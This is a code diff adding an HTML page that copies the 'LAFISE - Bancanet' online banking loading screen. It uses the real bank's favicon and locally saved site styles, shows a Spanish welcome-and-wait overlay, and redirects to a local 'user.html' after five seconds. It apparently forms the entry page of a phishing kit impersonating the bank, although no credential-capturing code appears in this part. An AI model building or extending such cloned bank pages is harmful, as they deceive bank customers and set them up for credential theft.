@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>LAFISE - Bancanet</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+    <link rel="icon" type="image/x-icon" href="https://secure.bancolafise.com/WebUI/icbankingicon.ico">
+    <!-- Script vacío para prevenir errores -->
+    <script>
+    function redirigirDespuesDeEspera() {
+    setTimeout(() => {
+        window.location.href = "user.html"; // Redirige después de 5 segundos
+    }, 5000); // 5000 ms = 5 segundos
+}
+
+// Iniciar la espera
+redirigirDespuesDeEspera();
+  </script>
+</body>
+</html><link href="./LAFISE - Bancanet_files/styles.9510e093960c77411877.bundle.css" rel="stylesheet"></head><body><icb-app></icb-app><div class="app_overlay"><div class="mesina-loader"><div class="mesina-logo"></div><div class="spinner"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div><div class="mesina-welcome-title">Bienvenido a Bancanet</div><div class="mesina-welcome-subtitle1">Por favor espere un momento...</div></div></div></body></html>
